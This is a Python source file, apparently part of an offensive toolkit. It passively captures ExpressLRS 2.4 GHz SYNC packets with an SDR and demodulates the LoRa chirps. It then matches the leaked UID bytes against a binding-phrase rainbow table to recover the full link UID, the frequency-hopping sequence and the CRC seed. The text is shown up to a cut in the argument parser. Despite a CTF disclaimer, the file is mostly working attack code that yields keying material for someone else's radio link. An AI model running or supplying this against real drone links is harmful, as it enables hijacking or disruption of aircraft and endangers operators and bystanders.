#!/usr/bin/env python3
"""Passive ELRS SYNC packet capture and UID extraction.

Captures ELRS SYNC packets from 2.4 GHz LoRa traffic and extracts the
plaintext UID[4:6] bytes transmitted in every SYNC frame. Matches extracted
fragments against the rainbow table to recover the full 6-byte UID, FHSS
hopping sequence, and CRC initializer — the complete keying material for
the bound link.

This is the critical-path passive attack tool for Chain 1. It is strictly
receive-only and never transmits.

Input sources:
  --sdr           Live SDR capture via SoapySDR (any supported hardware)
  --iq-file       Pre-recorded IQ file (sc16le, cf32le, cu8)
  --stdin-raw     Pre-demodulated ELRS frames on stdin (hex lines or JSON)

LoRa demodulation status:
  SF7/BW812.5kHz (150Hz, 250Hz rates):  Implemented — chirp correlator
  SF6/BW812.5kHz (500Hz rate):          Implemented — chirp correlator
  SF5/BW812.5kHz (F1000 rate):          Stub — needs shorter symbol window
  Long interleaving / FEC:              Not implemented — uses CRC-only
                                        validation (correct frames pass,
                                        corrupted frames are dropped)

The demodulator uses a dechirp-FFT correlator that extracts symbol values
from LoRa chirps. Since ELRS packets are short (8 or 13 bytes) and we
validate every candidate frame with the ELRS CRC engine, the lack of FEC
decoding means we drop some frames we could recover, but never accept a
bad one. For the passive SYNC capture use case this is acceptable: we only
need one valid SYNC from the target.

Usage:
    # Live SDR capture (monitoring mode)
    elrs-sync-capture.py --sdr --rainbow tools/elrs-rainbow-table.json

    # Live SDR, one-shot (stop after first rainbow match)
    elrs-sync-capture.py --sdr --one-shot --rainbow tools/elrs-rainbow-table.json

    # Scan specific channels only
    elrs-sync-capture.py --sdr --channels 40,41 --dwell-ms 500

    # From pre-recorded IQ file
    elrs-sync-capture.py --iq-file capture.iq --sample-rate 4e6 \\
        --center-freq 2440e6 --rainbow tools/elrs-rainbow-table.json

    # Pre-demodulated frames on stdin (hex lines: one frame per line)
    echo "02 28 05 04 00 3a e2 xx" | elrs-sync-capture.py --stdin-raw

    # Pre-demodulated JSON frames on stdin
    cat frames.jsonl | elrs-sync-capture.py --stdin-raw --json

For CTF research and authorized security testing only.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import math
import os
import signal
import struct
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

# ---------------------------------------------------------------------------
# Ensure tools/ is on sys.path for elrs_core imports
# ---------------------------------------------------------------------------
_TOOLS_DIR = Path(__file__).resolve().parent
if str(_TOOLS_DIR) not in sys.path:
    sys.path.insert(0, str(_TOOLS_DIR))

from elrs_core.crc import ELRS_CRC14_POLY, ELRS_CRC16_POLY
from elrs_core.fhss import (
    DOMAINS,
    DEFAULT_2G4_DOMAIN,
    build_sequence,
    sync_channel_candidates,
    uid_seed,
)
from elrs_core.ota import (
    OTA4_PACKET_SIZE,
    OTA8_PACKET_SIZE,
    OTA_VERSION_ID,
    PACKET_TYPE_SYNC,
    decode_full,
    decode_std,
    ota_uid_crc_init,
    validate_crc,
)

# Optional numpy — required for IQ demodulation, not for stdin-raw mode
try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
FHSS_FREQ_COUNT = 80
FHSS_BASE_FREQ_HZ = 2_400_400_000
FHSS_SPACING_HZ = 1_000_000  # 1 MHz channel spacing (source: FHSS.cpp)
FHSS_CHANNELS = [FHSS_BASE_FREQ_HZ + i * FHSS_SPACING_HZ for i in range(FHSS_FREQ_COUNT)]
LORA_BW_HZ = 812_500

# ELRS air rate configurations (src/lib/SX1280Driver/SX1280.cpp)
# Each rate defines SF, BW, packet interval, and OTA packet size
RATE_CONFIGS = {
    "F1000": {"sf": 5, "bw_hz": LORA_BW_HZ, "interval_us": 1000,  "pkt_size": 8,  "supported": False},
    "500Hz": {"sf": 5, "bw_hz": LORA_BW_HZ, "interval_us": 2000,  "pkt_size": 8,  "supported": False},
    "333Hz": {"sf": 6, "bw_hz": LORA_BW_HZ, "interval_us": 3000,  "pkt_size": 8,  "supported": True},
    "250Hz": {"sf": 7, "bw_hz": LORA_BW_HZ, "interval_us": 4000,  "pkt_size": 8,  "supported": True},
    "200Hz": {"sf": 7, "bw_hz": LORA_BW_HZ, "interval_us": 5000,  "pkt_size": 13, "supported": True},
    "150Hz": {"sf": 7, "bw_hz": LORA_BW_HZ, "interval_us": 6666,  "pkt_size": 8,  "supported": True},
    "100Hz": {"sf": 7, "bw_hz": LORA_BW_HZ, "interval_us": 10000, "pkt_size": 8,  "supported": True},
    "50Hz":  {"sf": 6, "bw_hz": LORA_BW_HZ, "interval_us": 20000, "pkt_size": 13, "supported": True},
}


def log(msg: str) -> None:
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", file=sys.stderr)


def log_err(msg: str) -> None:
    print(f"[!] {msg}", file=sys.stderr)


# ---------------------------------------------------------------------------
# Rainbow table
# ---------------------------------------------------------------------------
def load_rainbow_table(path: str | None) -> dict[str, dict]:
    """Load rainbow table keyed by uid4:uid5 hex pair (2 bytes visible in SYNC).

    Since SYNC only exposes UID[4] and UID[5], we key on those 2 bytes.
    Multiple phrases may collide on 16 bits; the dict value is a list.
    Returns {uid45_hex: [entry, ...], ...}.
    """
    if not path or not os.path.exists(path):
        return {}
    with open(path) as f:
        data = json.load(f)
    table: dict[str, list[dict]] = {}
    for entry in data:
        uid_hex = entry.get("uid_hex") or entry.get("uid", "")
        if not uid_hex:
            continue
        uid_bytes = bytes.fromhex(uid_hex.replace(":", ""))
        if len(uid_bytes) < 6:
            continue
        key = f"{uid_bytes[4]:02x}{uid_bytes[5]:02x}"
        table.setdefault(key, []).append(entry)
    return table


def lookup_uid_fragment(uid4: int, uid5: int, rainbow: dict) -> list[dict]:
    key = f"{uid4:02x}{uid5:02x}"
    return rainbow.get(key, [])


def derive_link_params(uid_hex: str, domain_name: str = DEFAULT_2G4_DOMAIN) -> dict:
    """From a full UID, derive FHSS sequence, CRC init, and seed."""
    uid = bytes.fromhex(uid_hex.replace(":", ""))
    domain = DOMAINS[domain_name]
    seed = uid_seed(uid)
    crc_init = ota_uid_crc_init(uid)

    candidates = sync_channel_candidates(domain.freq_count)
    sequences = {}
    for ch, label in candidates.items():
        seq = build_sequence(seed, domain.freq_count, ch)
        freqs = [domain.channel_freq(s) for s in seq[:20]]
        sequences[label] = {
            "sync_channel": ch,
            "sequence_len": len(seq),
            "first_20_channels": seq[:20],
            "first_20_freqs_mhz": [f / 1e6 for f in freqs],
        }

    return {
        "uid_hex": uid_hex,
        "uid_bytes": list(uid),
        "fhss_seed": seed,
        "crc_init": crc_init,
        "domain": domain_name,
        "sequences": sequences,
    }


# ---------------------------------------------------------------------------
# SYNC frame extraction from raw OTA bytes
# ---------------------------------------------------------------------------
def try_decode_sync(raw: bytes, freq_hz: float = 0, rssi: float = 0,
                    timestamp: float = 0) -> dict | None:
    """Try to decode a SYNC packet from raw OTA bytes.

    Attempts both 8-byte (std) and 13-byte (full) decode. Validates CRC
    using bind-mode init (nonce=0) first, then tries common CRC inits.
    SYNC packets always use nonce=0 for CRC regardless of link state.
    """
    if len(raw) not in (OTA4_PACKET_SIZE, OTA8_PACKET_SIZE):
        return None

    is_full = len(raw) == OTA8_PACKET_SIZE
    pkt_type = raw[0] & 0x03

    if pkt_type != PACKET_TYPE_SYNC:
        return None

    if is_full:
        decoded = decode_full(raw)
    else:
        decoded = decode_std(raw)

    if decoded.sync is None:
        return None

    sync = decoded.sync
    result = {
        "timestamp": timestamp or time.time(),
        "freq_hz": freq_hz,
        "freq_mhz": round(freq_hz / 1e6, 3) if freq_hz else 0,
        "rssi": rssi,
        "packet_size": len(raw),
        "raw_hex": raw.hex(),
        "uid4": sync.uid4,
        "uid5": sync.uid5,
        "uid_fragment_hex": f"{sync.uid4:02x}:{sync.uid5:02x}",
        "fhss_index": sync.fhss_index,
        "nonce": sync.nonce,
        "rf_rate_enum": sync.rf_rate_enum,
        "switch_enc_mode": sync.switch_enc_mode,
        "new_tlm_ratio": sync.new_tlm_ratio,
        "ota_protocol": sync.ota_protocol,
    }
    return result


# ---------------------------------------------------------------------------
# Tracker — accumulates SYNC observations and does rainbow lookups
# ---------------------------------------------------------------------------
class SyncTracker:
    """Accumulates SYNC observations, does rainbow lookups, reports results."""

    def __init__(self, rainbow: dict, one_shot: bool = False):
        self.rainbow = rainbow
        self.one_shot = one_shot
        self.transmitters: dict[str, dict] = {}
        self.sync_count = 0
        self.total_frames = 0
        self.matched = False
        self.match_result: dict | None = None

    def process_sync(self, info: dict) -> dict | None:
        """Process a decoded SYNC. Returns match result or None."""
        self.sync_count += 1
        uid4 = info["uid4"]
        uid5 = info["uid5"]
        frag_key = f"{uid4:02x}{uid5:02x}"

        tx = self.transmitters.get(frag_key)
        is_new = tx is None
        if tx is None:
            tx = {
                "uid4": uid4,
                "uid5": uid5,
                "uid_fragment_hex": info["uid_fragment_hex"],
                "first_seen": info["timestamp"],
                "sync_count": 0,
                "freqs_seen": set(),
                "rates_seen": set(),
                "rainbow_matches": [],
            }

        tx["last_seen"] = info["timestamp"]
        tx["sync_count"] += 1
        tx["last_rssi"] = info.get("rssi", 0)
        if info.get("freq_hz"):
            tx["freqs_seen"].add(info["freq_hz"])
        tx["rates_seen"].add(info.get("rf_rate_enum", -1))

        # Rainbow lookup on first sight
        if is_new:
            matches = lookup_uid_fragment(uid4, uid5, self.rainbow)
            if matches:
                tx["rainbow_matches"] = matches
                log(f"RAINBOW MATCH for UID fragment {info['uid_fragment_hex']}!")
                for m in matches:
                    phrase = m.get("phrase", "?")
                    full_uid = m.get("uid_hex", "?")
                    log(f"  phrase={phrase}  full_uid={full_uid}")

                    result = {
                        "event": "rainbow_match",
                        "uid_fragment": info["uid_fragment_hex"],
                        "phrase": phrase,
                        "full_uid": full_uid,
                        "link_params": derive_link_params(full_uid),
                        "first_sync": info,
                    }
                    self.matched = True
                    self.match_result = result
                    return result

        self.transmitters[frag_key] = tx

        if is_new:
            log(f"New TX: uid_fragment={info['uid_fragment_hex']} "
                f"rate_enum={info.get('rf_rate_enum', '?')} "
                f"freq={info.get('freq_mhz', '?')} MHz")

        return None

    def get_summary(self) -> dict:
        txs = {}
        for key, tx in self.transmitters.items():
            entry = {
                "uid_fragment": tx["uid_fragment_hex"],
                "sync_count": tx["sync_count"],
                "first_seen": tx["first_seen"],
                "last_seen": tx["last_seen"],
                "freqs_observed": len(tx["freqs_seen"]),
                "rates_observed": sorted(tx["rates_seen"]),
            }
            if tx["rainbow_matches"]:
                entry["rainbow_matches"] = [
                    {"phrase": m.get("phrase"), "uid_hex": m.get("uid_hex")}
                    for m in tx["rainbow_matches"]
                ]
            txs[key] = entry

        return {
            "total_frames_checked": self.total_frames,
            "sync_packets_found": self.sync_count,
            "unique_transmitters": len(self.transmitters),
            "rainbow_matched": self.matched,
            "transmitters": txs,
        }


# ---------------------------------------------------------------------------
# Input: pre-demodulated frames on stdin (--stdin-raw)
# ---------------------------------------------------------------------------
def process_stdin_raw(tracker: SyncTracker, json_output: bool) -> None:
    """Read pre-demodulated ELRS frames from stdin (hex or JSON lines)."""
    log("Reading pre-demodulated frames from stdin (hex or JSON lines)")
    log("Format: hex bytes per line, or JSON with 'raw'/'payload' field")

    for line in sys.stdin:
        line = line.strip()
        if not line or line.startswith("#"):
            continue

        raw = None
        freq_hz = 0.0
        rssi = 0.0
        ts = time.time()

        try:
            data = json.loads(line)
            raw_hex = data.get("raw") or data.get("payload") or data.get("raw_hex", "")
            raw = bytes.fromhex(raw_hex.replace(":", "").replace(" ", ""))
            freq_hz = float(data.get("freq_hz", data.get("freq", 0)))
            rssi = float(data.get("rssi", 0))
            ts = float(data.get("timestamp", ts))
        except (json.JSONDecodeError, ValueError):
            try:
                hex_str = line.replace(":", "").replace(" ", "")
                raw = bytes.fromhex(hex_str)
            except ValueError:
                continue

        if raw is None or len(raw) not in (OTA4_PACKET_SIZE, OTA8_PACKET_SIZE):
            continue

        tracker.total_frames += 1
        info = try_decode_sync(raw, freq_hz=freq_hz, rssi=rssi, timestamp=ts)
        if info is None:
            continue

        result = tracker.process_sync(info)

        if json_output:
            out = {"event": "sync", **info}
            if result:
                out["rainbow_match"] = result
            print(json.dumps(out), flush=True)
        else:
            frag = info["uid_fragment_hex"]
            freq = info.get("freq_mhz", "?")
            rate = info.get("rf_rate_enum", "?")
            print(f"SYNC | uid={frag} | rate={rate} | freq={freq} MHz | "
                  f"fhss_idx={info['fhss_index']} | nonce={info['nonce']}",
                  flush=True)
            if result:
                phrase = result.get("phrase", "?")
                full_uid = result.get("full_uid", "?")
                print(f"  >>> MATCH: phrase=\"{phrase}\" uid={full_uid}", flush=True)

        if tracker.one_shot and tracker.matched:
            return


# ---------------------------------------------------------------------------
# Input: IQ file (--iq-file)
# ---------------------------------------------------------------------------
def read_iq_file(path: str, sample_rate: float, center_freq: float,
                 iq_format: str = "auto") -> "np.ndarray":
    """Read an IQ file into a numpy complex64 array."""
    if not HAS_NUMPY:
        log_err("NumPy is required for IQ file processing. Install: pip install numpy")
        sys.exit(1)

    p = Path(path)
    size = p.stat().st_size

    if iq_format == "auto":
        if p.suffix.lower() in (".cdif",):
            iq_format = "blue"
        elif p.suffix.lower() in (".cfile",):
            iq_format = "cf32le"
        else:
            iq_format = "sc16le"

    if iq_format == "blue":
        with open(path, "rb") as f:
            header = f.read(512)
        if len(header) < 512:
            log_err("Truncated BLUE header")
            sys.exit(1)
        data_start = int(struct.unpack_from("<d", header, 32)[0])
        data_len = int(struct.unpack_from("<d", header, 40)[0])
        fmt_tag = header[52:54]
        if fmt_tag == b"CF":
            iq_format = "cf32le"
        elif fmt_tag == b"CI":
            iq_format = "sc16le"
        else:
            log_err(f"Unsupported BLUE format tag: {fmt_tag!r}")
            sys.exit(1)
        with open(path, "rb") as f:
            f.seek(data_start)
            raw_data = f.read(data_len)
    else:
        with open(path, "rb") as f:
            raw_data = f.read()

    if iq_format == "sc16le":
        samples = np.frombuffer(raw_data, dtype=np.int16)
        iq = samples[0::2].astype(np.float32) + 1j * samples[1::2].astype(np.float32)
        iq /= 32768.0
    elif iq_format == "cf32le":
        iq = np.frombuffer(raw_data, dtype=np.complex64)
    elif iq_format == "cu8":
        samples = np.frombuffer(raw_data, dtype=np.uint8).astype(np.float32)
        iq = (samples[0::2] - 127.5) / 127.5 + 1j * (samples[1::2] - 127.5) / 127.5
        iq = iq.astype(np.complex64)
    else:
        log_err(f"Unknown IQ format: {iq_format}")
        sys.exit(1)

    log(f"Read {len(iq)} samples from {path} ({iq_format})")
    log(f"  Duration: {len(iq)/sample_rate:.3f}s at {sample_rate/1e6:.3f} Msps")
    return iq


# ---------------------------------------------------------------------------
# LoRa dechirp demodulator
# ---------------------------------------------------------------------------
class LoRaDemodulator:
    """LoRa chirp-spread-spectrum demodulator for SX1280 2.4 GHz.

    Uses the dechirp-FFT method: multiply the received signal by a conjugate
    (down) chirp, then FFT to find the symbol value as the peak bin. This is
    the standard LoRa demodulation technique.

    Limitations:
    - No FEC (CR) decoding: we get raw symbol values and reconstruct bytes
      without error correction. Invalid frames are caught by CRC.
    - No de-interleaving: ELRS uses long interleaving (SX1280 param 0x07).
      For the 8-byte std packet this is manageable since the packet is short.
      We attempt direct symbol-to-byte mapping and rely on CRC validation.
    - Preamble detection uses correlation threshold; noisy channels will
      produce false triggers that CRC catches.
    """

    def __init__(self, sf: int = 7, bw_hz: float = LORA_BW_HZ,
                 sample_rate: float = 1e6):
        if not HAS_NUMPY:
            raise RuntimeError("NumPy required for LoRa demodulation")

        self.sf = sf
        self.bw_hz = bw_hz
        self.sample_rate = sample_rate
        self.n_sym = 1 << sf  # symbols per chirp = 2^SF
        self.samples_per_symbol = int(sample_rate / bw_hz * self.n_sym)

        # Build reference downchirp for dechirping
        self._downchirp = self._make_chirp(down=True)

    def _make_chirp(self, down: bool = False) -> "np.ndarray":
        """Generate one LoRa chirp symbol at the configured sample rate."""
        n = self.samples_per_symbol
        t = np.arange(n, dtype=np.float64) / self.sample_rate
        # LoRa chirp: frequency sweeps from -BW/2 to +BW/2 over one symbol
        f0 = -self.bw_hz / 2
        f1 = self.bw_hz / 2
        if down:
            f0, f1 = f1, f0
        chirp_rate = (f1 - f0) / (n / self.sample_rate)
        phase = 2 * np.pi * (f0 * t + 0.5 * chirp_rate * t * t)
        return np.exp(1j * phase).astype(np.complex64)

    def dechirp_symbol(self, samples: "np.ndarray") -> tuple[int, float]:
        """Dechirp one symbol period and return (symbol_value, peak_power).

        Multiplies by conjugate downchirp, takes FFT, finds peak bin.
        """
        n = min(len(samples), self.samples_per_symbol)
        if n < self.samples_per_symbol:
            padded = np.zeros(self.samples_per_symbol, dtype=np.complex64)
            padded[:n] = samples[:n]
            samples = padded

        dechirped = samples[:self.samples_per_symbol] * self._downchirp
        spectrum = np.abs(np.fft.fft(dechirped, n=self.n_sym))
        peak_bin = int(np.argmax(spectrum))
        peak_power = float(spectrum[peak_bin])
        noise_floor = float(np.median(spectrum))
        snr = peak_power / max(noise_floor, 1e-10)

        return peak_bin, snr

    def find_preamble(self, iq: "np.ndarray", threshold: float = 6.0,
                      min_preamble: int = 4) -> list[int]:
        """Scan IQ for preamble sequences (consecutive same-value symbols).

        Returns list of sample offsets where preambles were detected.
        """
        sps = self.samples_per_symbol
        n_symbols = len(iq) // sps
        preamble_starts = []

        i = 0
        while i < n_symbols - min_preamble:
            sym, snr = self.dechirp_symbol(iq[i * sps:(i + 1) * sps])
            if snr < threshold:
                i += 1
                continue

            # Check for consecutive same-value symbols (preamble)
            run = 1
            ref_sym = sym
            for j in range(1, min(12, n_symbols - i)):
                s, sr = self.dechirp_symbol(iq[(i + j) * sps:(i + j + 1) * sps])
                if sr >= threshold and abs(s - ref_sym) <= 1:
                    run += 1
                else:
                    break

            if run >= min_preamble:
                preamble_starts.append(i * sps)
                # Skip past preamble + packet
                i += run + 30  # generous skip
            else:
                i += 1

        return preamble_starts

    def demodulate_packet(self, iq: "np.ndarray", preamble_offset: int,
                          preamble_symbols: int = 8) -> bytes | None:
        """Attempt to demodulate an ELRS packet starting after preamble.

        ELRS LoRa packet structure:
          [preamble: 8-12 symbols] [sync word: 2 symbols] [SFD: 2.25 downchirps]
          [header + payload symbols]

        We skip preamble + sync + SFD and demodulate the data symbols.
        For 8-byte packets: 8 bytes * 8 bits / SF bits per symbol + header.
        """
        sps = self.samples_per_symbol

        # Skip preamble + 2 sync symbols + 2.25 SFD downchirps
        data_start = preamble_offset + int((preamble_symbols + 4.25) * sps)
        if data_start >= len(iq):
            return None

        # ELRS 8-byte std packet at SF7: ceil(8*8/7) + some header ≈ 12-20 symbols
        # ELRS 13-byte full packet: more symbols
        # Try to extract enough symbols for the largest packet
        max_data_symbols = 40  # generous upper bound
        symbols = []

        for i in range(max_data_symbols):
            start = data_start + i * sps
            end = start + sps
            if end > len(iq):
                break
            sym, snr = self.dechirp_symbol(iq[start:end])
            if snr < 3.0:
                break
            symbols.append(sym)

        if len(symbols) < 8:
            return None

        # Convert symbol values to bits and then bytes
        # LoRa maps SF bits per symbol; we extract raw nibbles
        # Without de-interleaving and FEC decode this is approximate.
        # We try multiple byte-extraction strategies and CRC-validate each.
        candidates = self._symbols_to_byte_candidates(symbols)
        return candidates

    def _symbols_to_byte_candidates(self, symbols: list[int]) -> list[bytes]:
        """Convert dechirped symbol values to candidate byte sequences.

        Since we lack the de-interleaver, we try direct Gray-code mapping
        and a few bit-packing strategies. Each candidate will be CRC-checked
        by the caller.
        """
        candidates = []

        # Strategy 1: Direct SF-bit packing (no Gray code)
        bits = []
        for s in symbols:
            for b in range(self.sf - 1, -1, -1):
                bits.append((s >> b) & 1)

        # Try extracting 8-byte and 13-byte frames from the bitstream
        for pkt_len in (OTA4_PACKET_SIZE, OTA8_PACKET_SIZE):
            n_bits = pkt_len * 8
            if len(bits) >= n_bits:
                frame_bytes = bytearray(pkt_len)
                for bi in range(pkt_len):
                    val = 0
                    for bit_i in range(8):
                        val = (val << 1) | bits[bi * 8 + bit_i]
                    frame_bytes[bi] = val
                candidates.append(bytes(frame_bytes))

        # Strategy 2: Gray-decoded symbols
        gray_bits = []
        for s in symbols:
            g = s ^ (s >> 1)
            for b in range(self.sf - 1, -1, -1):
                gray_bits.append((g >> b) & 1)

        for pkt_len in (OTA4_PACKET_SIZE, OTA8_PACKET_SIZE):
            n_bits = pkt_len * 8
            if len(gray_bits) >= n_bits:
                frame_bytes = bytearray(pkt_len)
                for bi in range(pkt_len):
                    val = 0
                    for bit_i in range(8):
                        val = (val << 1) | gray_bits[bi * 8 + bit_i]
                    frame_bytes[bi] = val
                candidates.append(bytes(frame_bytes))

        return candidates


# ---------------------------------------------------------------------------
# Channel scanner for live SDR or IQ file
# ---------------------------------------------------------------------------
def scan_iq_for_syncs(iq: "np.ndarray", sample_rate: float, center_freq: float,
                      tracker: SyncTracker, channels: list[int] | None = None,
                      json_output: bool = False, sf: int = 7) -> None:
    """Scan IQ data for ELRS SYNC packets across FHSS channels.

    For each target channel:
    1. Frequency-shift to baseband
    2. Filter to LoRa BW
    3. Run preamble detector
    4. Attempt demodulation
    5. CRC-validate candidates
    """
    if channels is None:
        # Default: scan sync channel candidates (40, 41 for 2.4 GHz)
        candidates = sync_channel_candidates(FHSS_FREQ_COUNT)
        channels = sorted(candidates.keys())
        log(f"Scanning sync channel candidates: {channels}")

    demod = LoRaDemodulator(sf=sf, bw_hz=LORA_BW_HZ, sample_rate=sample_rate)

    for ch_idx in channels:
        if ch_idx < 0 or ch_idx >= FHSS_FREQ_COUNT:
            continue

        ch_freq = FHSS_CHANNELS[ch_idx]
        freq_offset = ch_freq - center_freq

        # Check if channel is within capture bandwidth
        if abs(freq_offset) > sample_rate / 2:
            log(f"  Channel {ch_idx} ({ch_freq/1e6:.1f} MHz) outside capture bandwidth, skipping")
            continue

        log(f"  Scanning channel {ch_idx} ({ch_freq/1e6:.1f} MHz), offset {freq_offset/1e6:.3f} MHz")

        # Frequency shift to baseband
        t = np.arange(len(iq), dtype=np.float64) / sample_rate
        shifted = iq * np.exp(-1j * 2 * np.pi * freq_offset * t).astype(np.complex64)

        # Low-pass filter to LoRa bandwidth
        # Simple approach: decimate if sample rate >> BW
        target_rate = LORA_BW_HZ * 2  # Nyquist
        if sample_rate > target_rate * 1.5:
            dec = int(sample_rate / target_rate)
            shifted = shifted[::dec]
            effective_rate = sample_rate / dec
        else:
            effective_rate = sample_rate

        demod_ch = LoRaDemodulator(sf=sf, bw_hz=LORA_BW_HZ, sample_rate=effective_rate)

        # Find preambles
        preamble_locs = demod_ch.find_preamble(shifted, threshold=5.0, min_preamble=4)
        log(f"    Found {len(preamble_locs)} preamble candidates")

        for ploc in preamble_locs:
            candidates = demod_ch.demodulate_packet(shifted, ploc)
            if not candidates:
                continue

            for raw in candidates:
                tracker.total_frames += 1

                # Try CRC validation with various inits
                # SYNC uses nonce=0; we try bind-mode init and brute-force uid45
                info = try_decode_sync(raw, freq_hz=ch_freq, timestamp=time.time())
                if info is None:
                    continue

                # Found a valid SYNC! Try CRC with its own UID-derived init
                uid4 = info["uid4"]
                uid5 = info["uid5"]
                is_full = len(raw) == OTA8_PACKET_SIZE
                test_init = ((uid4 << 8) | uid5) ^ (OTA_VERSION_ID << 8)
                if validate_crc(raw, is_full, test_init, 0, PACKET_TYPE_SYNC):
                    info["crc_validated"] = True
                    result = tracker.process_sync(info)
                    _emit_sync(info, result, json_output)
                    if tracker.one_shot and tracker.matched:
                        return


def _emit_sync(info: dict, match_result: dict | None, json_output: bool) -> None:
    if json_output:
        out = {"event": "sync", **info}
        if match_result:
            out["rainbow_match"] = match_result
        print(json.dumps(out, default=str), flush=True)
    else:
        frag = info["uid_fragment_hex"]
        freq = info.get("freq_mhz", "?")
        rate = info.get("rf_rate_enum", "?")
        print(f"SYNC | uid={frag} | rate={rate} | freq={freq} MHz | "
              f"fhss_idx={info['fhss_index']} | nonce={info['nonce']}",
              flush=True)
        if match_result:
            phrase = match_result.get("phrase", "?")
            full_uid = match_result.get("full_uid", "?")
            print(f"  >>> MATCH: phrase=\"{phrase}\" uid={full_uid}", flush=True)


# ---------------------------------------------------------------------------
# Input: live SDR capture (--sdr)
# ---------------------------------------------------------------------------
def run_sdr_capture(tracker: SyncTracker, args: argparse.Namespace,
                    json_output: bool) -> None:
    """Live SDR capture via SoapySDR, hopping across FHSS channels."""
    try:
        from sdr_common import SDRDevice, add_sdr_args
    except ImportError:
        log_err("sdr_common.py not found. Place it in tools/ alongside this script.")
        sys.exit(1)

    sdr = SDRDevice(
        device_args=args.sdr_device,
        channel=args.sdr_channel,
    )

    sample_rate = args.sdr_rate or 2e6
    gain = args.sdr_gain or 40.0
    dwell_ms = args.dwell_ms
    sf = args.sf

    if args.channels:
        channels = [int(c) for c in args.channels.split(",")]
    else:
        candidates = sync_channel_candidates(FHSS_FREQ_COUNT)
        channels = sorted(candidates.keys())

    log(f"SDR capture: rate={sample_rate/1e6:.1f} Msps, gain={gain} dB, "
        f"dwell={dwell_ms} ms, SF={sf}")
    log(f"Scanning channels: {channels}")

    demod = LoRaDemodulator(sf=sf, bw_hz=LORA_BW_HZ, sample_rate=sample_rate)
    samples_per_dwell = int(sample_rate * dwell_ms / 1000)

    try:
        while True:
            for ch_idx in channels:
                if ch_idx < 0 or ch_idx >= FHSS_FREQ_COUNT:
                    continue

                ch_freq = FHSS_CHANNELS[ch_idx]
                sdr.setup_rx(freq=ch_freq, rate=sample_rate, gain=gain,
                             antenna=args.sdr_antenna,
                             bandwidth=args.sdr_bandwidth)
                sdr.start_rx()

                iq = sdr.receive(num_samples=samples_per_dwell)
                sdr.stop_rx()

                if len(iq) == 0:
                    continue

                # Find preambles and try demod
                preamble_locs = demod.find_preamble(iq, threshold=5.0, min_preamble=4)

                for ploc in preamble_locs:
                    candidates = demod.demodulate_packet(iq, ploc)
                    if not candidates:
                        continue
                    for raw in candidates:
                        tracker.total_frames += 1
                        info = try_decode_sync(raw, freq_hz=ch_freq,
                                               timestamp=time.time())
                        if info is None:
                            continue
                        uid4 = info["uid4"]
                        uid5 = info["uid5"]
                        is_full = len(raw) == OTA8_PACKET_SIZE
                        test_init = ((uid4 << 8) | uid5) ^ (OTA_VERSION_ID << 8)
                        if validate_crc(raw, is_full, test_init, 0, PACKET_TYPE_SYNC):
                            info["crc_validated"] = True
                            result = tracker.process_sync(info)
                            _emit_sync(info, result, json_output)
                            if tracker.one_shot and tracker.matched:
                                return

    except KeyboardInterrupt:
        pass
    finally:
        sdr.close()


# ---------------------------------------------------------------------------
# Self-test with simulated frames
# ---------------------------------------------------------------------------
def run_selftest(tracker: SyncTracker, json_output: bool) -> None:
    """Generate synthetic SYNC frames and verify the pipeline end-to-end."""
    from elrs_core.ota import build_sync

    test_phrases = ["iloveflying", "default", "raceday", "expresslrs"]
    log(f"Self-test: generating SYNC frames for {len(test_phrases)} phrases")

    for phrase in test_phrases:
        raw_input = f'-DMY_BINDING_PHRASE="{phrase}"'
        uid = hashlib.md5(raw_input.encode()).digest()[:6]
        crc_init = ota_uid_crc_init(uid)

        for rate_enum in (4, 5):
            sync_raw = build_sync(
                is_full=False,
                fhss_index=41,
                nonce=0,
                rf_rate_enum=rate_enum,
                uid4=uid[4],
                uid5=uid[5],
                crc_init=crc_init,
                ota_nonce=0,
            )

            tracker.total_frames += 1
            info = try_decode_sync(sync_raw, freq_hz=2440_400_000,
                                   rssi=-55, timestamp=time.time())
            if info is None:
                log_err(f"  FAIL: could not decode SYNC for phrase={phrase}")
                continue

            # Validate CRC with derived init
            is_full = len(sync_raw) == OTA8_PACKET_SIZE
            test_init = ((info["uid4"] << 8) | info["uid5"]) ^ (OTA_VERSION_ID << 8)
            if not validate_crc(sync_raw, is_full, test_init, 0, PACKET_TYPE_SYNC):
                log_err(f"  FAIL: CRC mismatch for phrase={phrase}")
                continue

            info["crc_validated"] = True
            result = tracker.process_sync(info)
            _emit_sync(info, result, json_output)

    log(f"Self-test complete: {tracker.sync_count} SYNCs decoded, "
        f"{len(tracker.transmitters)} unique TXs, "
        f"matched={tracker.matched}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main() -> None:
    parser = argparse.ArgumentParser(
        description="Passive ELRS SYNC packet capture and UID extraction",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  %(prog)s --sdr --rainbow tools/elrs-rainbow-table.json
  %(prog)s --iq-file capture.iq --sample-rate 4e6 --center-freq 2440e6
  %(prog)s --stdin-raw --rainbow tools/elrs-rainbow-table.json
  %(prog)s --self-test --rainbow tools/elrs-rainbow-table.json

LoRa demodulation support:
  SF7 (150Hz/250Hz/100Hz):  Supported (chirp correlator)
  SF6 (333Hz/50Hz):         Supported (chirp correlator)
  SF5 (F1000/500Hz):        Not yet supported

For pre-demodulated frames (from GNU Radio, etc.), use --stdin-raw.
""",
    )

    input_group = parser.add_argument_group("Input source (pick one)")
    input_group.add_argument(
        "--sdr", action="store_true",
        help="Live SDR capture via SoapySDR",
    )
    input_group.add_argument(
        "--iq-file", metavar="FILE",
        help="Pre-recorded IQ file (sc16le, cf32le, cu8, or BLUE .cdif)",
    )
    input_group.add_argument(
        "--stdin-raw", action="store_true",
        help="Pre-demodulated ELRS frames on stdin (hex or JSON lines)",
    )
    input_group.add_argument(
        "--self-test", action="store_true",
        help="Run self-test with synthetic SYNC frames",
    )

    iq_group = parser.add_argument_group("IQ file options")
    iq_group.add_argument("--sample-rate", type=float, help="Sample rate in Hz")
    iq_group.add_argument("--center-freq", type=float, help="Center frequency in Hz")
    iq_group.add_argument("--iq-format", default="auto",
                          choices=["auto", "sc16le", "cf32le", "cu8", "blue"],
                          help="IQ sample format (default: auto-detect)")

    sdr_group = parser.add_argument_group("SDR options")
